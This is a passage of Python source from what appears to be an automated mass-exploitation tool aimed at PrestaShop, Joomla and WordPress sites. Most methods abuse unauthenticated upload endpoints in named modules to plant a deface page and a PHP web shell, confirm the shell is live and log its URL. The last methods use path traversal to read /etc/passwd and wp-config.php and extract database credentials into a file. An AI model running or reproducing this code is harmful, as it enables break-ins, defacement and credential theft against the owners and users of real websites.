                IndexPath = '/modules/jro_homepageadvertise/slides/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + site + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=self.Headers)
                    ShellPath = '/modules/jro_homepageadvertise/slides/' + self.ShellPresta.split('/')[1]
                    CheckShell = requests.get('http://' + site + ShellPath, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in CheckShell.text:
                        self.Print_vuln_Shell(ShellPath)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('jro_homepageadvertise', site)
            else:
                self.Print_NotVuln('jro_homepageadvertise', site)
        except:
            self.Print_NotVuln('jro_homepageadvertise', site)

    def attributewizardpro(self, site):
        try:
            Exp = site + '/modules/attributewizardpro/file_upload.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
            if self.Jce_Deface_image.split('/')[1] in GoT.text:
                Index = GoT.text.split('|||')[0]
                IndexPath = site + '/modules/attributewizardpro/file_uploads/' + Index
                CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    Got2 = requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=self.Headers)
                    if self.ShellPresta.split('/')[1] in GoT.text:
                        Shell = Got2.text.split('|||')[0]
                        ShellPath = site + '/modules/attributewizardpro/file_uploads/' + Shell
                        CheckShell = requests.get('http://' + ShellPath, timeout=5, headers=self.Headers)
                        if 'MisterSpyv7up' in CheckShell.text:
                            self.Print_vuln_Shell(ShellPath)
                            with open('Exploited/Shells.txt', 'a') as writer:
                                writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('attributewizardpro', site)
            else:
                self.Print_NotVuln('attributewizardpro', site)
        except:
            self.Print_NotVuln('attributewizardpro', site)


    def attributewizardpro2(self, site):
        try:
            Exp = site + '/modules/1attributewizardpro/file_upload.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
            if self.Jce_Deface_image.split('/')[1] in GoT.text:
                Index = GoT.text.split('|||')[0]
                IndexPath = site + '/modules/1attributewizardpro/file_uploads/' + Index
                CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    Got2 = requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=self.Headers)
                    if self.ShellPresta.split('/')[1] in GoT.text:
                        Shell = Got2.text.split('|||')[0]
                        ShellPath = site + '/modules/1attributewizardpro/file_uploads/' + Shell
                        CheckShell = requests.get('http://' + ShellPath, timeout=5, headers=self.Headers)
                        if 'MisterSpyv7up' in CheckShell.text:
                            self.Print_vuln_Shell(ShellPath)
                            with open('Exploited/Shells.txt', 'a') as writer:
                                writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('1attributewizardpro', site)
            else:
                self.Print_NotVuln('1attributewizardpro', site)
        except:
            self.Print_NotVuln('1attributewizardpro', site)

    def attributewizardpro3(self, site):
        try:
            Exp = site + '/modules/attributewizardpro.OLD/file_upload.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
            if self.Jce_Deface_image.split('/')[1] in GoT.text:
                Index = GoT.text.split('|||')[0]
                IndexPath = site + '/modules/attributewizardpro.OLD/file_uploads/' + Index
                CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    Got2 = requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=self.Headers)
                    if self.ShellPresta.split('/')[1] in GoT.text:
                        Shell = Got2.text.split('|||')[0]
                        ShellPath = site + '/modules/attributewizardpro.OLD/file_uploads/' + Shell
                        CheckShell = requests.get('http://' + ShellPath, timeout=5, headers=self.Headers)
                        if 'MisterSpyv7up' in CheckShell.text:
                            self.Print_vuln_Shell(ShellPath)
                            with open('Exploited/Shells.txt', 'a') as writer:
                                writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('attributewizardpro.OLD', site)
            else:
                self.Print_NotVuln('attributewizardpro.OLD', site)
        except:
            self.Print_NotVuln('attributewizardpro.OLD', site)

    def attributewizardpro_x(self, site):
        try:
            Exp = site + '/modules/attributewizardpro_x/file_upload.php'
            FileDataIndex = {'userfile': open(self.Jce_Deface_image, 'rb')}
            FileDataShell = {'userfile': open(self.ShellPresta, 'rb')}
            GoT = requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
            if self.Jce_Deface_image.split('/')[1] in GoT.text:
                Index = GoT.text.split('|||')[0]
                IndexPath = site + '/modules/attributewizardpro_x/file_uploads/' + Index
                CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                    Got2 = requests.post('http://' + Exp, files=FileDataShell, timeout=5, headers=self.Headers)
                    if self.ShellPresta.split('/')[1] in GoT.text:
                        Shell = Got2.text.split('|||')[0]
                        ShellPath = site + '/modules/attributewizardpro_x/file_uploads/' + Shell
                        CheckShell = requests.get('http://' + ShellPath, timeout=5, headers=self.Headers)
                        if 'MisterSpyv7up' in CheckShell.text:
                            self.Print_vuln_Shell(ShellPath)
                            with open('Exploited/Shells.txt', 'a') as writer:
                                writer.write(ShellPath + '\n')
                else:
                    self.Print_NotVuln('attributewizardpro_x', site)
            else:
                self.Print_NotVuln('attributewizardpro_x', site)
        except:
            self.Print_NotVuln('attributewizardpro_x', site)

    def advancedslider(self, site):
        try:
            Exp = site + '/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php'
            Checkvuln = requests.get('http://' + Exp, timeout=5, headers=self.Headers)
            FileDataIndex = {'qqfile': open(self.Jce_Deface_image, 'rb')}
            if Checkvuln.status_code == 200:
                requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
                IndexPath = site + '/modules/advancedslider/uploads/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                else:
                    self.Print_NotVuln('advancedslider', site)
            else:
                self.Print_NotVuln('advancedslider', site)
        except:
            self.Print_NotVuln('advancedslider', site)

    def cartabandonmentpro(self, site):
        try:
            Exp = site + '/modules/cartabandonmentpro/upload.php'
            Checkvuln = requests.get('http://' + Exp, timeout=5, headers=self.Headers)
            FileDataIndex = {'image': open(self.Jce_Deface_image, 'rb')}
            if Checkvuln.status_code == 200:
                requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
                IndexPath = site + '/modules/cartabandonmentpro/uploads/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                else:
                    self.Print_NotVuln('cartabandonmentpro', site)
            else:
                self.Print_NotVuln('cartabandonmentpro', site)
        except:
            self.Print_NotVuln('cartabandonmentpro', site)

    def cartabandonmentproOld(self, site):
        try:
            Exp = site + '/modules/cartabandonmentproOld/upload.php'
            Checkvuln = requests.get('http://' + Exp, timeout=5, headers=self.Headers)
            FileDataIndex = {'image': open(self.Jce_Deface_image, 'rb')}
            if Checkvuln.status_code == 200:
                requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
                IndexPath = site + '/modules/cartabandonmentproOld/uploads/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                else:
                    self.Print_NotVuln('cartabandonmentproOld', site)
            else:
                self.Print_NotVuln('cartabandonmentproOld', site)
        except:
            self.Print_NotVuln('cartabandonmentproOld', site)

    def videostab(self, site):
        try:
            Exp = site + '/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload'
            Checkvuln = requests.get('http://' + Exp, timeout=5, headers=self.Headers)
            FileDataIndex = {'qqfile': open(self.Jce_Deface_image, 'rb')}
            if Checkvuln.status_code == 200:
                requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
                IndexPath = site + '/modules/videostab/uploads/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                else:
                    self.Print_NotVuln('videostab', site)
            else:
                self.Print_NotVuln('videostab', site)
        except:
            self.Print_NotVuln('videostab', site)

    def wg24themeadministration(self, site):
        Exl = site + '/modules/wg24themeadministration/wg24_ajax.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5, headers=self.Headers)
            if Checkvuln.status_code == 200:
                PostData = {'data': 'bajatax',
                            'type': 'pattern_upload'}
                FileDataIndex = {'bajatax': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'bajatax': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/wg24themeadministration/img/upload/'\
                                    + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/wg24themeadministration/img/upload/'\
                                    + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, data=PostData, timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, data=PostData,
                                  timeout=5, headers=self.Headers)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in Checkshell.text:
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('wg24themeadministration', site)
            else:
                self.Print_NotVuln('wg24themeadministration', site)
        except:
            self.Print_NotVuln('wg24themeadministration', site)


    def fieldvmegamenu(self, site):
        Exl = site + '/modules/fieldvmegamenu/ajax/upload.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5, headers=self.Headers)
            if Checkvuln.status_code == 200:
                FileDataIndex = {'images[]': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'images[]': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/fieldvmegamenu/uploads/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/fieldvmegamenu/uploads/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, timeout=5, headers=self.Headers)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in Checkshell.text:
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('fieldvmegamenu', site)
            else:
                self.Print_NotVuln('fieldvmegamenu', site)
        except:
            self.Print_NotVuln('fieldvmegamenu', site)


    def wdoptionpanel(self, site):
        Exl = site + '/modules/wdoptionpanel/wdoptionpanel_ajax.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5, headers=self.Headers)
            if Checkvuln.status_code == 200:
                PostData = {'data': 'bajatax',
                            'type': 'image_upload'}
                FileDataIndex = {'bajatax': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'bajatax': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/wdoptionpanel/upload/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/wdoptionpanel/upload/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, data=PostData, timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, data=PostData, timeout=5, headers=self.Headers)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in Checkshell.text:
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('wdoptionpanel', site)
            else:
                self.Print_NotVuln('wdoptionpanel', site)
        except:
            self.Print_NotVuln('wdoptionpanel', site)


    def pk_flexmenu(self, site):
        Exl = site + '/modules/pk_flexmenu/ajax/upload.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5, headers=self.Headers)
            if Checkvuln.status_code == 200:
                FileDataIndex = {'images[]': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'images[]': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/pk_flexmenu/uploads/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/pk_flexmenu/uploads/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, timeout=5, headers=self.Headers)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in Checkshell.text:
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('pk_flexmenu', site)
            else:
                self.Print_NotVuln('pk_flexmenu', site)
        except:
            self.Print_NotVuln('pk_flexmenu', site)


    def nvn_export_orders(self, site):
        Exl = site + '/modules/nvn_export_orders/upload.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5, headers=self.Headers)
            if Checkvuln.status_code == 200:
                FileDataIndex = {'images[]': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'images[]': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/nvn_export_orders/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/nvn_export_orders/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, timeout=5, headers=self.Headers)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in Checkshell.text:
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('nvn_export_orders', site)
            else:
                self.Print_NotVuln('nvn_export_orders', site)
        except:
            self.Print_NotVuln('nvn_export_orders', site)

    def megamenu(self, site):
        try:
            Exp = site + '/modules/megamenu/uploadify/uploadify.php?id=pwn'
            Checkvuln = requests.get('http://' + Exp, timeout=5, headers=self.Headers)
            FileDataIndex = {'Filedata': open(self.Jce_Deface_image, 'rb')}
            if Checkvuln.status_code == 200:
                requests.post('http://' + Exp, files=FileDataIndex, timeout=5, headers=self.Headers)
                IndexPath = site + '/' + self.Jce_Deface_image.split('/')[1]
                CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(IndexPath)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(IndexPath + '\n')
                else:
                    self.Print_NotVuln('megamenu', site)
            else:
                self.Print_NotVuln('megamenu', site)
        except:
            self.Print_NotVuln('megamenu', site)



    def tdpsthemeoptionpanel(self, site):
        Exl = site + '/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5, headers=self.Headers)
            if Checkvuln.status_code == 200:
                FileDataIndex = {'image_upload': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'image_upload': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/tdpsthemeoptionpanel/upload/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/tdpsthemeoptionpanel/upload/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, timeout=5, headers=self.Headers)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in Checkshell.text:
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('tdpsthemeoptionpanel', site)
            else:
                self.Print_NotVuln('tdpsthemeoptionpanel', site)
        except:
            self.Print_NotVuln('tdpsthemeoptionpanel', site)

    def psmodthemeoptionpanel(self, site):
        Exl = site + '/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5, headers=self.Headers)
            if Checkvuln.status_code == 200:
                FileDataIndex = {'image_upload': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'image_upload': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/modules/psmodthemeoptionpanel/upload/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/modules/psmodthemeoptionpanel/upload/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, timeout=5, headers=self.Headers)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in Checkshell.text:
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('psmodthemeoptionpanel', site)
            else:
                self.Print_NotVuln('psmodthemeoptionpanel', site)
        except:
            self.Print_NotVuln('psmodthemeoptionpanel', site)


    def lib(self, site):
        Exl = site + '/modules/lib/redactor/file_upload.php'
        try:
            Checkvuln = requests.get('http://' + Exl, timeout=5, headers=self.Headers)
            if Checkvuln.status_code == 200:
                FileDataIndex = {'file': open(self.Jce_Deface_image, 'rb')}
                FileDataShell = {'file': open(self.ShellPresta, 'rb')}
                uploadedPathIndex = site + '/masseditproduct/uploads/file/' + self.Jce_Deface_image.split('/')[1]
                uploadedPathShell = site + '/masseditproduct/uploads/file/' + self.ShellPresta.split('/')[1]
                requests.post('http://' + Exl, files=FileDataIndex, timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(uploadedPathIndex)
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(uploadedPathIndex + '\n')
                    requests.post('http://' + Exl, files=FileDataShell, timeout=5, headers=self.Headers)
                    Checkshell = requests.get('http://' + uploadedPathShell, timeout=5, headers=self.Headers)
                    if 'MisterSpyv7up' in Checkshell.text:
                        self.Print_vuln_Shell(uploadedPathShell)
                        with open('Exploited/Shells.txt', 'a') as writer:
                            writer.write(uploadedPathShell + '\n')
                else:
                    self.Print_NotVuln('lib', site)
            else:
                self.Print_NotVuln('lib', site)
        except:
            self.Print_NotVuln('lib', site)

    def Com_Jbcatalog(self, site):
        Check = requests.get('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php',
                             timeout=10, headers=self.Headers)
        if Check.status_code == 200:
            ShellFile = {'files[]': open(self.ShellPresta, 'rb')}
            requests.post('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php',
                                files=ShellFile, headers=self.Headers, timeout=10)
            CheckShell = requests.get('http://' + site +
                                      '/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php',
                                      timeout=5, headers=self.Headers)

            if 'MisterSpyv7up' in CheckShell.text:
                self.Print_vuln_Shell(site + '/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php')
                with open('Exploited/Shells.txt', 'a') as writer:
                    writer.write(site + '/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php\n')
            else:
                ShellFile = {'files[]': open(self.Jce_Deface_image, 'rb')}
                requests.post('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php',
                              files=ShellFile, headers=self.Headers, timeout=10)

                CheckIndex = requests.get('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/'
                                                             'php/files/' + self.Jce_Deface_image.split('/')[1],
                                          timeout=10, headers=self.Headers)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/components/com_jbcatalog/libraries/jsupload/server/php/files/'
                                          + self.Jce_Deface_image.split('/')[1])
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/components/com_jbcatalog/libraries/jsupload/server/php/files/'
                                     + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_Jbcatalog', site)
        else:
            self.Print_NotVuln('Com_Jbcatalog', site)



    def Com_SexyContactform(self, site):
        Check = requests.get('http://' + site + '/components/com_sexycontactform/fileupload/',
                             timeout=10, headers=self.Headers)
        if Check.status_code == 200:
            IndeX = {'files[]': open(self.Jce_Deface_image, 'rb')}
            ShellFile = {'files[]': open(self.ShellPresta, 'rb')}
            requests.post('http://' + site + '/components/com_sexycontactform/fileupload/',
                                files=ShellFile, timeout=10, headers=self.Headers)
            CheckShell = requests.get('http://' + site +
                                      '/components/com_sexycontactform/fileupload/files/up.php',
                                      timeout=5, headers=self.Headers)

            if 'MisterSpyv7up' in CheckShell.text:
                self.Print_vuln_Shell(site + '/components/com_sexycontactform/fileupload/files/up.php')
                with open('Exploited/Shells.txt', 'a') as writer:
                    writer.write(site + '/components/com_sexycontactform/fileupload/files/up.php\n')
            else:
                requests.post('http://' + site + '/components/com_jbcatalog/libraries/jsupload/server/php',
                              files=IndeX, headers=self.Headers, timeout=10)

                CheckIndex = requests.get('http://' + site + '/components/com_sexycontactform/fileupload/files/'
                                          + self.Jce_Deface_image.split('/')[1], headers=self.Headers, timeout=10)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/components/com_sexycontactform/fileupload/files/'
                                          + self.Jce_Deface_image.split('/')[1])
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/components/com_sexycontactform/fileupload/files/'
                                     + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_SexyContactform', site)
        else:
            self.Print_NotVuln('Com_SexyContactform', site)


    def Com_rokdownloads(self, site):
        Check = requests.get('http://' + site + '/administrator/components/com_rokdownloads/assets/uploadhandler.php',
                             timeout=10, headers=self.Headers)
        if Check.status_code == 200 or Check.status_code == 500:
            IndeX = {'files[]': open(self.Jce_Deface_image, 'rb')}

            ShellFile = {'files[]': open(self.ShellPresta, 'rb')}
            Datapost = {'jpath': '../../../../'}
            requests.post('http://' + site + '/administrator/components/com_rokdownloads/assets/uploadhandler.php',
                                files=ShellFile, data=Datapost, timeout=10, headers=self.Headers)
            CheckShell = requests.get('http://' + site +
                                      '/images/stories/up.php', timeout=5, headers=self.Headers)

            if 'MisterSpyv7up' in CheckShell.text:
                self.Print_vuln_Shell(site + '/images/stories/up.php')
                with open('Exploited/Shells.txt', 'a') as writer:
                    writer.write(site + '/images/stories/up.php\n')
            else:
                requests.post('http://' + site + '/administrator/components/com_rokdownloads/assets/uploadhandler.php',
                              files=IndeX, data=Datapost, timeout=10, headers=self.Headers)

                CheckIndex = requests.get('http://' + site + '/images/stories/' + self.Jce_Deface_image.split('/')[1],
                                          headers=self.Headers, timeout=10)
                if 'D9ABB614B8D911E3AB27A52B5ED2F278' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/images/stories/' + self.Jce_Deface_image.split('/')[1])
                    with open('Exploited/Index.txt', 'a') as writer:
                        writer.write(site + '/images/stories/' + self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Com_rokdownloads', site)
        else:
            self.Print_NotVuln('Com_rokdownloads', site)

    def wp_miniaudioplayer(self, site):
        CheckVuln = requests.get('http://' + site, timeout=10, headers=self.Headers)
        if 'wp-miniaudioplayer' in CheckVuln.text:
            etc = requests.get('http://' + site +
                         '/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/etc/passwd',
                               timeout=5, headers=self.Headers)
            if 'nologin' in etc.text:
                with open('Exploited/Passwd_file.text', 'a') as writer:
                    writer.write('---------------------------\nSite: ' + site + '\n' + etc.text + '\n')
                self.Print_Vuln('wp-miniaudioplayer', site)
            else:
                self.Print_NotVuln('wp-miniaudioplayer', site)
        else:
            self.Print_NotVuln('wp-miniaudioplayer', site)



    def wp_support_plus_responsive_ticket_system(self, site):
        try:
            Exp = 'http://' + site + \
                  '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/' \
                  'downloadAttachment.php?path=../../../../../wp-config.php'
            GetConfig = requests.get(Exp, timeout=5, headers=self.Headers)
            if 'DB_PASSWORD' in GetConfig.text:
                self.Print_vuln_Config(site)
                with open('Exploited/AutoConfig.txt', 'a') as ww:
                    ww.write('Full Config Path  : ' + Exp + '\n')
                try:
                    Gethost = re.findall("'DB_HOST', '(.*)'", GetConfig.text)
                    Getuser = re.findall("'DB_USER', '(.*)'", GetConfig.text)
                    Getpass = re.findall("'DB_PASSWORD', '(.*)'", GetConfig.text)
                    Getdb = re.findall("'DB_NAME', '(.*)'", GetConfig.text)
                    with open('Exploited/AutoConfig.txt', 'a') as ww:
                        ww.write(' Host:  ' + Gethost[0] + '\n' + ' user:  ' + Getuser[0] +
                                 '\n' + ' pass:  ' + Getpass[0] + '\n' + ' DB:    ' + Getdb[
